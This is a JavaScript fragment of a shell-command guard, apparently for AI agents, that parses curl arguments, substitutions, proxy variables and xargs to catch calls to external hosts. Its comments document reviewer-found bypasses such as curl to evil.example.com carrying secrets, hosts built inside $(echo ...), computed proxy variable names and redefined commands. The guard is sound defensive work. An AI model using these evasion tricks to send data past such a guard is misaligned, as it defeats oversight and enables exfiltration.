  // innerAt[k]: the offset of inners[k]'s `$(` / backtick (the same in `text` and `stripped`).
  // innerEnd[k]: the offset just past inners[k]'s closing `)` / backtick.
  const inners = []; const innerAt = []; const innerEnd = []; const herestrings = []; let out = ''; let i = 0
  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
  const lift = (at) => {
    if (text[at] === '$' && text[at + 1] === '(') {
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); innerAt.push(at); innerEnd.push(j); out += ' '.repeat(j - at); return j
    }
    if (text[at] === '`') {
      const j = backtickEnd(text, at)
      inners.push(text.slice(at + 1, j - 1)); innerAt.push(at); innerEnd.push(j); out += ' '.repeat(j - at); return j
    }
    return -1
  }
  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
  // (a `gh pr comment --body "... \`code\` ..."`).
  const copyLive = (from, to) => {
    let k = from
    while (k < to) {
      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
      const n = lift(k)
      if (n !== -1) { k = n; continue }
      out += text[k]; k++
    }
  }
  while (i < text.length) {
    const c = text[i]
    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
    // and the word after it is parsed as ordinary (quoted or live) text.
    if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
    if (here) {
      const tag = here[1] ?? here[2] ?? here[3]
      const quotedTag = here[1] != null || here[2] != null
      out += here[0]; i += here[0].length
      const nl = text.indexOf('\n', i)
      if (nl === -1) { copyLive(i, text.length); break }
      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
      // by processing it recursively, then continue with the body
      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
      out += lineRest.stripped; inners.push(...lineRest.inners); innerAt.push(...lineRest.innerAt.map((p) => p + i))
      innerEnd.push(...lineRest.innerEnd.map((p) => p + i))
      herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(text.slice(i))
      const bodyEnd = rel ? i + rel.index : text.length
      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
      i = bodyEnd
      continue
    }
    if (c === "'") {
      const end = text.indexOf("'", i + 1)
      const stop = end === -1 ? text.length : end + 1
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      const stop = Math.min(j + 1, text.length)
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\') { j += 2; continue }
        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
        if (text[j] === '`') { j = backtickEnd(text, j); continue }
        j++
      }
      out += '"'
      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
      copyLive(i + 1, j); out += '"'; i = j + 1; continue
    }
    const n = lift(i)
    if (n !== -1) { i = n; continue }
    out += c; i++
  }
  // marked: `stripped` with each lifted region filled with its own marker instead of blanks, so a
  // reader can still tell WHERE a substitution stood (a curl destination built by one, didi F3).
  let marked = out
  innerAt.forEach((at, k) => { marked = marked.slice(0, at) + markOf(k).repeat(innerEnd[k] - at) + marked.slice(innerEnd[k]) })
  return { stripped: out, marked, inners, innerAt, innerEnd, herestrings }
}
// A lifted substitution's place in a marked text: one private-use character per substitution, k-th
// substitution = U+E000 + k, repeated over its length (length-preserving, never whitespace, never a
// shell metacharacter, so it stays inside the word it was part of).
const MARK_BASE = 0xE000
const MARK_LAST = 0xF8FF
const MARKS = /[\uE000-\uF8FF]/
function markOf(k) { return String.fromCharCode(Math.min(MARK_BASE + k, MARK_LAST)) }
// Every `$(...)` and backtick in `text`, quoting ignored, replaced by its marker: for an UNREADABLE line,
// whose quoting is exactly what could not be read. Erring toward a marker only judges more text.
function markAllSubstitutions(text) {
  const inners = []; let out = ''; let i = 0
  while (i < text.length) {
    if (text[i] === '\\') { out += text.slice(i, i + 2); i += 2; continue }
    let j = -1
    if (text[i] === '$' && text[i + 1] === '(') { j = substEnd(text, i); inners.push(text.slice(i + 2, j - 1)) }
    else if (text[i] === '`') { j = backtickEnd(text, i); inners.push(text.slice(i + 1, j - 1)) }
    if (j === -1) { out += text[i]; i++; continue }
    out += markOf(inners.length - 1).repeat(j - i); i = j
  }
  return { marked: out, inners }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// The value of an ANSI-C quoted word's body (`$'...'` without the quotes). `eval $'curl ...'` and a
// `$'curl'` command word ran curl while the word read was `$curl` (didi 36152, dexter). A `\n` in an
// eval's line is a command separator there, and is read as one.
const ANSI_C = { a: 7, b: 8, e: 27, E: 27, f: 12, n: 10, r: 13, t: 9, v: 11, '\\': 92, "'": 39, '"': 34, '?': 63 }
function ansiC(body) {
  const out = body.replace(/\\(?:([0-7]{1,3})|x([0-9a-fA-F]{1,2})|u([0-9a-fA-F]{1,4})|U([0-9a-fA-F]{1,8})|c(.)|(.))/gs,
    (m, o, x, u, U, c, e) => {
      if (o || x || u || U) {
        const n = parseInt(o ?? x ?? u ?? U, o ? 8 : 16)
        return String.fromCodePoint(Math.min(n, 0x10ffff))
      }
      if (c !== undefined) return String.fromCharCode(c.charCodeAt(0) & 31)
      return e in ANSI_C ? String.fromCharCode(ANSI_C[e]) : m
    })
  return out
}
// Every `$'...'` of a text replaced by its value. Over-reads a `$'` inside other quotes, which only
// makes a line read MORE names, never fewer.
const decodeAnsiCQuotes = (text) => text.replace(/\$'((?:[^'\\]|\\[\s\S])*)'/g, (_m, body) => ansiC(body))
// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
export function shellWords(text) {
  const out = []; let cur = null; let i = 0
  const push = () => { if (cur !== null) out.push(cur); cur = null }
  while (i < text.length) {
    const c = text[i]
    if (/\s/.test(c)) { push(); i++; continue }
    cur ??= ''
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      cur += ansiC(text.slice(i + 2, Math.min(j, text.length))); i = j + 1; continue
    }
    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
    // Inside "...", a backslash escapes only $ ` " \ and a newline; before any other character it
    // stays: `sh -c "export http$'\x5f'proxy=P; curl ..."` hands sh the `\x5f`, and sh sets
    // http_proxy (read as `x5f` it was no proxy name; didi 36603 item 4).
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\' && j + 1 < text.length) { cur += /[$`"\\\n]/.test(text[j + 1]) ? text[j + 1] : text.slice(j, j + 2); j += 2; continue }
        cur += text[j]; j++
      }
      i = j + 1; continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
    cur += c; i++
  }
  push()
  return out
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
// Any number of slashes after the scheme's colon: curl reads `http:///evil.example.com/x` (and `http:/`,
// `http:////`) as that host (didi 36014, measured on loopback).
const SCHEME_PREFIX = /^[^/?#\s]*:\/+/
function hostPortion(value) {
  // file: names no network host (curl refuses any but localhost there): `file:///tmp/x` is a path
  if (/^file:/i.test(String(value))) return ''
  const noScheme = String(value).replace(SCHEME_PREFIX, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  return m ? m[1].toLowerCase() : ''
}
export function destHost(value) {
  if (!value) return null
  const h = hostPortion(value)
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
// The hosts a substitution's command text names (didi F3, card c8b1ccbf): every word, a `://` word
// through destHost, any other word whose host part (path, userinfo and port cut off) is a hostname.
// Unlike an unreadable line's word reading, a bare dotted name counts: in a destination it IS the host.
const SUBST_WORD_SPLIT = /[\s"'`;|&()<>=,{}$]+/
function substHostCandidates(inner) {
  const out = []
  for (const w of String(inner).split(SUBST_WORD_SPLIT)) {
    if (!w) continue
    if (w.includes('://')) { const h = destHost(w); if (h) out.push(h); continue }
    const name = w.split(/[/?#]/)[0].replace(/^.*@/, '').replace(/:\d+$/, '').toLowerCase()
    if (HOSTNAME.test(name)) out.push(name)
  }
  return out
}
// A line that can give a command name a new meaning: a function definition (`NAME()`, `function NAME`,
// zsh's `a b () {...}`), an alias, eval / source / `.` / enable, a zsh name table (`functions[echo]=`),
// a lookup change (`PATH=`, `hash`, `autoload`, `disable`, BASH_ENV), or an exported bash function
// (`BASH_FUNC_echo%%=`). On such a line a text-only word (`cat`, `echo`) is no proof that a body fed to
// it stays text (`cat(){ python3 -; }; export -f cat; bash -c 'cat' <<S` ran the body, didi round 7
// item 3), so every body fed on the line is read for a network word and an external host as well.
// The list is a trigger for that extra reading, not the guard itself: a redefinition it does not name
// leaves the line exactly as strict as before. A curl destination does not depend on it at all (a
// substitution in the host part is never trusted, see curlDestinations).
// PATH is NOT a trigger. Measured on 21 086 fleet commands (2026-10-16): `export PATH=.../node@22/bin`
// opens many of them, and as a trigger it denied 10 that write test files about this guard. A PATH
// change only matters with an executable planted on disk beforehand, which is the cross-command limit
// a per-command parser has anyway (a function written into ~/.zshenv by an earlier command).
// A quote or backslash before the name counts as a word start: past classify's depth bound a nested
// `bash -c` body is read as raw text, where the definition sits behind `'"'"'` (dexter, 2026-10-16).
// `.` counts only as a command word: `find .`, `git add .` and `ls .` source nothing (didi round 7 item 5).
const DEFINES_COMMANDS = new RegExp([
  String.raw`(?:^|[\s;&|({!'"\\])(?:function\s+[^\s;&|<>]+|[^\s(){};&|<>=$"'` + '`' + String.raw`]+\s*\(\s*\)|(?:alias|eval|source|enable|disable|hash|autoload)(?:\s|$))`,
  String.raw`(?:^|[;&|({!'"\\\n])[ \t]*\.(?:\s|$)`,
  String.raw`(?:^|[\s;&|({!'"\\])(?:functions|aliases|builtins|commands)\[`,
  String.raw`(?:^|[\s;&|({!'"\\])(?:fpath|FPATH|BASH_ENV|ENV|ZDOTDIR)\+?=`,
].join('|'))
// Read on the ORIGINAL text: an `env 'BASH_FUNC_echo%%=() {...}'` or `env 'PATH=...'` word is quoted,
// and the masked text the readable path checks has it blanked.
const DEFINES_IN_QUOTES = /BASH_FUNC_|['"](?:fpath|FPATH|BASH_ENV|ENV|ZDOTDIR)\+?=/
function definesCommands(text) { return DEFINES_COMMANDS.test(String(text)) }
// Output-file flags: their value is a path curl writes, never a host (an unreadable line's word
// reading took `-o out.dir/file.json` for the host out.dir, didi's review 3).
const CURL_FILE_SHORT = new Set(['o', 'D', 'c'])
const CURL_FILE_LONG = new Set(['output', 'output-dir', 'dump-header', 'cookie-jar', 'stderr', 'trace', 'trace-ascii', 'etag-save'])
// Every external destination host in a curl argv (the words AFTER `curl`).
// `inners`: the substitutions of a MARKED argv (markOf). A destination whose host part holds a marker
// was built by that substitution: the hosts its command text names are destinations, and when it names
// none the destination is unknowable and is returned as `$(<command>)`, a host no list holds (didi F3:
// `curl -s "$(echo evil.example.com/x)"` passed live). `fileValues`: collects output-file flag values.
// A substitution in the host part is ALWAYS unknowable, even `$(echo localhost)`: what echo, printf or
// cat print depends on what the names mean, and four review rounds found a new way to change that
// each time (a function, `functions[echo]=`, BASH_FUNC_ in the env, PATH / hash before the external
// cat, autoload; didi rounds 5-7). Only a host written out in the text counts as local. Likewise a
// `${...}` that is not a plain `${NAME}` (`${!r}`, `${h/a/b}`, `${h:9}`, `${a[0]}`) after expand():
// its value is computed, not read (didi round 6 item 4).
const COMPUTED_PARAM = /\$\{(?![A-Za-z_][A-Za-z0-9_]*\})/
// The part of a curl URL that decides WHERE it connects: the scheme prefix and the authority, up to
// the first / ? # (didi 35993). In it, a glob ({a,b}, [n-m]) is expanded by curl itself, or unquoted
// by the shell, -g or not: the host is a set this reading does not enumerate (`http://{localhost,
// evil.example.com}/x` fetched both). Likewise a `$` that is not a plain $NAME / ${NAME} (`$1`, `$@`,
// zsh `$^a`), a leftover array value `(x y)`, or a backslash escape (`$'...\x2e...'`). A bracketed
// IPv6 literal is the one bracket curl does not glob. A glob AFTER the authority (path, query) cannot
// move the host and stays readable.
function unreadableHostHead(value) {
  const s = String(value)
  const scheme = SCHEME_PREFIX.exec(s)?.[0] ?? ''
  const head = scheme + s.slice(scheme.length).split(/[/?#]/)[0]
  const rest = head.replace(/(^|@|\/\/)\[[0-9a-f:.]+\](?=:|$)/i, '$1')
  return /[{}[\]()\\]/.test(rest) || /\$(?![A-Za-z_{])/.test(rest)
}
// A `$NAME` this command leaves unexpanded is trusted as the agent's environment (`curl "$DASH/api"`)
// only while the command itself never writes NAME in a form the assignment reading does not take:
// `h+=x`, `h[0]=x`, `h=(x)`, `set -A h x`, `read h`, `getopts ab h` (didi 35993 item 3, and `read -r u
// < f; curl "$u"` passed with a URL from a file). The test is the NAME standing as a word anywhere in
// the command other than a plain `NAME=value` or `for NAME in`: what writes a name has to spell it, so
// the list of writing builtins is not needed (a mention that writes nothing errs toward a deny).
function writesNameUnread(text, name, fed = []) {
  const re = new RegExp(String.raw`(?<![\w$#!{./@:-])${name}(?![\w./@:-])`, 'g')
  for (const m of String(text).matchAll(re)) {
    if (fed.some(([a, b]) => m.index >= a && m.index < b)) continue
    const after = text.slice(m.index + name.length)
    if (/^=(?!\()/.test(after)) continue
    if (/^\s+in(?:\s|$)/.test(after) && /(?:^|[\s;&|(!{])for\s+$/.test(text.slice(0, m.index))) continue
    return true
  }
  return false
}
// The names a command references as $NAME / ${NAME...} (in `refs`: the masked text blanks a quoted
// "https://$h/x") that it also writes unread in `text` (see above).
// `fed`: the [start, end) of each `read` fed by a here-string or heredoc of this line (fedReads): its
// values are read from that text (collectReads / readValues), so its names are not written unread.
function unreadNames(text, inherited = null, refs = text, fed = []) {
  const out = new Set(inherited ?? [])
  for (const m of String(refs).matchAll(/\$\{?[#!]?([A-Za-z_][A-Za-z0-9_]*)/g)) {
    if (!out.has(m[1]) && writesNameUnread(text, m[1], fed)) out.add(m[1])
  }
  return out
}
// The `read` commands whose input is a here-string or heredoc of this line: `read u <<< X`, `read u
// <<EOF`, and `while read u; do ...; done <<< X` (the `done` matching that loop, nested loops
// counted). A `read` from a file, a pipe or `< <(...)` is not in it: its values are not on the line.
const LOOP_HEAD = new Set(['while', 'until', 'for', 'select'])
// `herestrings`: the offsets of the line's `<<<` operators (liftSubstitutions blanks them in `orig`).
function fedReads(orig, masked, herestrings = []) {
  const sp = spans(masked)
  const out = []
  const fedBy = (k) => herestrings.some((at) => at >= sp[k][0] && at < sp[k][1]) || /<<(?!<?\s*\()/.test(masked.slice(...sp[k]))
  sp.forEach(([a, b], i) => {
    const sw = shellWords(orig.slice(a, b))
    let k = commandIndex(sw)
    const loop = sw[k] === 'while' || sw[k] === 'until'
    if (loop) k += 1 + commandIndex(sw.slice(k + 1))
    if (sw[k] !== 'read') return
    if (!loop) { if (fedBy(i)) out.push([a, b]); return }
    let depth = 0
    for (let j = i + 1; j < sp.length; j++) {
      const w = shellWords(orig.slice(...sp[j]))[0]
      if (LOOP_HEAD.has(w)) depth++
      else if (w === 'done' && depth-- === 0) { if (fedBy(j)) out.push([a, b]); return }
    }
  })
  return out
}
// A curl reads ~/.curlrc (or $CURL_HOME/.curlrc, $XDG_CONFIG_HOME/curlrc) before its argv: a command
// that names that file writes or points at a config the argv reading never sees (quotes and
// backslashes dropped first: `.curl''rc` is the same file).
const CURLRC = /curlrc|CURL_HOME|XDG_CONFIG_HOME/
// A proxy variable (`http_proxy=`, `export HTTPS_PROXY=`, `env ALL_PROXY=`): curl connects to it for
// every URL, a localhost one too (didi 36014). Named on the line, it is a destination the argv never
// shows. `no_proxy` only narrows where a proxy is used.
const PROXY_ENV = /(?:^|[^A-Za-z0-9_])(?!no_proxy)[A-Za-z0-9]*_proxy(?![A-Za-z0-9_])/i
// Taking a proxy variable away (`unset http_proxy`, `env -u HTTPS_PROXY`) points curl nowhere new.
// The name list ends with its own command: blanks only, never a newline (`unset x` + newline +
// `export http_proxy=...` let the list swallow the next command's proxy name, didi 36059).
const PROXY_REMOVED = /(?:^|[\s;&|(])(?:unset(?:[ \t]+-[fv])?(?:[ \t]+[A-Za-z0-9_]+)+|env(?:[ \t]+(?:-u[ \t]*|--unset[= \t])[A-Za-z0-9_]+)+)/g
// A variable whose NAME is computed (`export ${v}proxy=...`, `env "$n=..." curl`, `declare -x "${p}=..."`,
// `printf -v "$n" ...`): which variable it sets is not read, and a proxy one points curl elsewhere
// (didi 36034, measured live). On a curl line it is an unknown destination. A brace in the name
// (`export http_{proxy,x}=`) expands to several names, `--` ends the options, `eval` builds the
// assignment at run time (didi 36059). The `=` may come from the expansion itself: `export $(echo
// ${v}proxy=P)`, `env $(cat f) curl`, `export $v` (didi 36152).
// Read per sub-command, from its words: only a declarer in COMMAND position counts. A regex over the
// quote-stripped line read "env $HOME" inside a -d payload, "use env $X" in a commit message and
// `eval "$(ssh-agent -s)"` as computed names (didi 36220 item 3).
const PRINTF_V_COMPUTED = /(?:^|[\s;&|(])printf\s+-v\s*[^\s;&|]*[$`]/
const DECLARERS = new Set(['export', 'declare', 'typeset', 'readonly', 'local'])
const COMPUTED_ASSIGN_NAME = /^(?=.*[$`])(?:[A-Za-z0-9_]|\$[A-Za-z_][A-Za-z0-9_]*|\$\{[^}]*\}|\$\([^)]*\)|`[^`]*`)+\+?$/
// The sub-commands of a line, split at unquoted ; & | newline and parentheses (quotes kept).
function subCommandTexts(text) {
  const out = []; let cur = ''; let q = null
  for (let i = 0; i < text.length; i++) {
    const c = text[i]
    if (q === "'") { cur += c; if (c === "'") q = null; continue }
    if (c === '\\') { cur += c + (text[i + 1] ?? ''); i++; continue }
    if (q === '"') { cur += c; if (c === '"') q = null; continue }
    if (c === "'" || c === '"') { q = c; cur += c; continue }
    if (/[;&|\n()]/.test(c)) { out.push(cur); cur = ''; continue }
    cur += c
  }
  out.push(cur)
  return out
}
function computedNameInWords(w) {
  let j = 0
  while (j < w.length) {
    while (j < w.length && /^[A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?\+?=/.test(w[j])) j++
    if (j >= w.length) return false
    // a computed name in assignment position (`eval "${v}proxy=P"`: eval makes it an assignment)
    // The name is name characters and expansions only: a `{"a":"b=c"}` heredoc or payload line is no
    // assignment (it read three fleet commands as computed names).
    if (w[j].includes('=') && COMPUTED_ASSIGN_NAME.test(w[j].slice(0, w[j].indexOf('=')))) return true
    const c = normalizedName(w[j]); j++
    // `eval "export ${v}proxy=P"`: eval's words are a line of their own
    if (c === 'eval') return computedEnvName(w.slice(j).join(' '))
    const declares = DECLARERS.has(c) || c === 'env'
    if (!declares && !PREFIX_COMMANDS.has(c) && !PREFIX_WORDS.has(c)) return false
    const withValue = PREFIX_OPT_VALUE[c] ?? new Set()
    let positional = PREFIX_POSITIONALS[c] ?? 0
    let ended = false
    while (j < w.length) {
      const a = w[j]
      if (a === '--' && !ended) { ended = true; j++; continue }
      if (!ended && /^[-+]./.test(a)) { j += withValue.has(a) ? 2 : 1; continue }
      if (!declares) { if (positional > 0) { positional--; j++; continue } break }
      const name = a.includes('=') ? a.slice(0, a.indexOf('=')) : a
      if (/[$`{]/.test(name)) return true
      if (c === 'env' && !a.includes('=')) break // env's command, read as the next command
      j++
    }
    if (DECLARERS.has(c)) return false
  }
  return false
}
function computedEnvName(text) {
  const t = foldSubstitutions(String(text))
  return PRINTF_V_COMPUTED.test(t) || subCommandTexts(t).some((s) => computedNameInWords(shellWords(s)))
}
// `xargs -I R ... env ...R... cmd`: the variable env sets is named by stdin, whatever R is (BSD -J
// too). Only env's own words count: an R in the command's arguments (`env FOO=1 curl
// http://localhost/{}`) names no variable (didi 36152 item 4).
const XARGS_ENV_NAME = /\bxargs\b[^;&|\n]*?(?:-[IJ]\s*(\S+)|-i(\S*)|--replace(?:=(\S+))?)[^;&|\n]*?\benv\b([^;&|\n]*)/
function xargsNamesEnv(text) {
  const m = XARGS_ENV_NAME.exec(text)
  if (!m) return false
  const r = m[1] ?? (m[2] || m[3] || '{}')
  for (const w of m[4].split(/\s+/).filter(Boolean)) {
    if (w.includes(r)) return true
    if (!w.startsWith('-') && !w.includes('=')) return false
  }
  return false
}
// xargs whose command word comes from stdin: a prefix command after xargs with nothing after it
// (`echo "curl URL" | xargs env`, `... | xargs nohup`), or a command word holding the replace string
// (`xargs -I{} {} URL`). What runs is not in the text (didi 36152 item 2).
function xargsStdinCommand(sw) {
  const k = commandIndex(sw)
  const pre = sw.slice(0, k).map(normalizedName)
  const x = pre.lastIndexOf('xargs')
  if (x === -1) return false
  if (k >= sw.length) return pre.slice(x + 1).some((w) => PREFIX_COMMANDS.has(w))
  const repl = xargsReplace(sw)
  return repl !== null && sw[k].includes(repl)
}
// The replace string of the xargs in front of a sub-command's command word (-I / -J / -i /
// --replace), or null.
function xargsReplace(sw) {
  const k = commandIndex(sw)
  const x = sw.slice(0, k).map(normalizedName).lastIndexOf('xargs')
  if (x === -1) return null
  let repl = null
  for (let j = x + 1; j < k; j++) {
    const a = sw[j]
    if (a === '-I' || a === '-J') repl = sw[j + 1] ?? null
    else if (/^-[IJ]./.test(a)) repl = a.slice(2)
    else if (a === '-i' || a === '--replace') repl = '{}'
    else if (/^(?:-i|--replace=)./.test(a)) repl = a.replace(/^(?:-i|--replace=)/, '')
  }
  return repl || null
}
// A shell under xargs whose command line comes from stdin (didi 36220 item 1): `xargs -0 sh -c` (no
// body here: xargs appends the stdin as the body), or a body that RUNS what xargs hands it -- a
// sub-command whose command word, eval line or nested -c body holds the replace string or a
// positional (`xargs -I{} sh -c {}`, `xargs -I{} bash -c "{}"`, `xargs sh -c '"$@"' _`). A body that
// only passes them as arguments (`xargs -I{} sh -c 'wc -l {}'`) stays readable.
// `$0` too: `xargs sh -c '$0 "$@"'` runs the first stdin word (didi 36252 T4).
const POSITIONAL_REF = /\$(?:[@*0-9]|\{[@*0-9][^}]*\})/
function xargsShellRunsStdin(args, repl) {
  let k = 0
  for (; k < args.length; k++) {
    const a = args[k]
    if (a === '--' || !/^[-+]/.test(a)) return false
    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) break
    if (/^[-+][oO]$/.test(a) || a === '--rcfile' || a === '--init-file') k++
  }
  if (k >= args.length) return false
  const raw = shellCBody(args)
  if (raw === null) return true
  const direct = (w) => (repl !== null && w.includes(repl)) || POSITIONAL_REF.test(w)
  // What xargs hands the body also runs through a substitution (`$(echo $0) URL`) or a variable the
  // body sets from it (`x=$0; $x URL`, `c=$1; eval "$c URL"`) (didi 36603 item 2): a substitution
  // that reads it is folded to a bare `$0`, the others to `$S`, and every name assigned from a fed
  // value is fed too.
  let body = raw
  for (let prev = null; prev !== body;) { prev = body; body = body.replace(/`[^`]*`|\$\([^()]*\)/g, (m) => (direct(m) ? '$0' : '$S')) }
  const tainted = new Set()
  const fed = (w) => direct(w) || [...tainted].some((n) => new RegExp(`\\$\\{?${n}(?![A-Za-z0-9_])`).test(w))
  // A builtin that binds names from its words binds them from a fed value too (`read x <<< "$0"`,
  // `printf -v x %s "$0"`, `for t in $0`; didi 36796): every name-like word of it is fed then.
  const BINDS = new Set(['read', 'printf', 'for', 'select', 'mapfile', 'readarray', 'declare', 'typeset', 'local', 'export', 'let'])
  const binders = subCommandTexts(body).map((x) => shellWords(x)).filter((w) => BINDS.has(normalizedName(w[commandIndex(w)] ?? w[0] ?? '')) || BINDS.has(w[0]))
  for (let size = -1; size !== tainted.size;) {
    size = tainted.size
    for (const m of body.matchAll(/(?:^|[\s;&|(){}])([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|\S*)/g)) if (fed(m[2])) tainted.add(m[1])
    for (const w of binders) if (w.some(fed)) for (const n of w) if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(n) && !BINDS.has(n)) tainted.add(n)
  }
  // split with quotes honoured: a `\|` inside a quoted grep pattern is no pipe (fleet replay)
  for (const w of subCommandTexts(body).map((x) => shellWords(x))) {
    const i = commandIndex(w)
    if (i >= w.length) continue
    const name = normalizedName(w[i])
    if (fed(w[i])) return true
    if (name === 'eval' && w.slice(i + 1).some(fed)) return true
    if (SHELL.test(name)) { const inner = shellCBody(w.slice(i + 1)); if (inner !== null && fed(inner)) return true }
  }
  return false
}
// A substitution inside a name may hold blanks (`export \`printf http_\`proxy=`): each one is
// folded to a bare `$S` first, so the name test sees one word.
const foldSubstitutions = (text) => text.replace(/`[^`]*`/g, '$S').replace(/\$\([^()]*\)/g, '$S')
// `ctx`: { unread: names written unread (unreadNames), text: the whole command, outer: the same
// without heredoc bodies, arrays: collectArrays }.
export function curlDestinations(args, inners = null, fileValues = null, ctx = null) {
  const dests = []
  const arrays = ctx?.arrays ?? {}
  args = args.flatMap((w) => {
    const m = /^\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\[[@*]\]\}|([A-Za-z_][A-Za-z0-9_]*))$/.exec(w)
    const name = m && (m[1] ?? m[2])
    return name && arrays[name] ? arrays[name] : [w]
  })
  // `$'...'` decoded BEFORE the quotes go: `export http$'\x5f'proxy=P` sets http_proxy, and with the
  // quotes dropped first it read `http$\x5fproxy` (didi 36252, a regression of round 6).
  // Read once more after quote removal: `eval 'export http$'"'"'\x5f'"'"'proxy=P'` hands eval the
  // ANSI-C word that the quotes split in the raw text (didi 36603, F06).
  const said = ctx?.text
    ? [String(ctx.text), shellWords(String(ctx.text)).join(' ')].map(decodeAnsiCQuotes).join('\n').replace(/['"\\]/g, '')
    : ''
  if (CURLRC.test(said)) dests.push('<curlrc>')
  if (PROXY_ENV.test(said.replace(PROXY_REMOVED, ' '))) dests.push('<proxy variable>')
  if (computedEnvName(ctx?.outer ?? ctx?.text ?? '') || xargsNamesEnv(said)) dests.push('<computed variable name>')
  const unreadVar = (part) => {
